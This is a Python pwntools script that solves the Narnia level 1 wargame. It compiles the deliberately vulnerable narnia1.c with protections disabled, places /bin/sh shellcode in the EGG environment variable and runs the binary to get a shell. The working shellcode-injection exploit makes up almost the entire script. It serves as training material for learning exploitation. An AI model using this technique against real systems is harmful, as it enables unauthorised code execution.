#!/usr/bin/env python
from pwn import *
import os

# Exploiting vulnerable code narnia1.c:
#
# #include <stdio.h>
#
# int main(){
# 	int (*ret)();
#
# 	if(getenv("EGG")==NULL){
# 		printf("Give me something to execute at the env-variable EGG\n");
# 		exit(1);
# 	}
#
# 	printf("Trying to execute EGG!\n");
# 	ret = getenv("EGG");
# 	ret();
#
# 	return 0;
# }

# Define the context of the working machine
context(arch='i386', os='linux')

# Compile the binary
log.info("Compiling the binary narnia1_local")
os.system('gcc narnia1.c -g -m32 -o narnia1_local -fno-stack-protector -z execstack')

# Get a simple shellcode
log.info("Putting together simple shellcode")
shellcode = asm(shellcraft.sh())
print(asm(shellcraft.sh()))

log.info("Introduce shellcode in EGG env. variable")
os.environ["EGG"] = shellcode

log.info("Launching narnia1_local")
sh = process('narnia1_local')
sh.interactive()
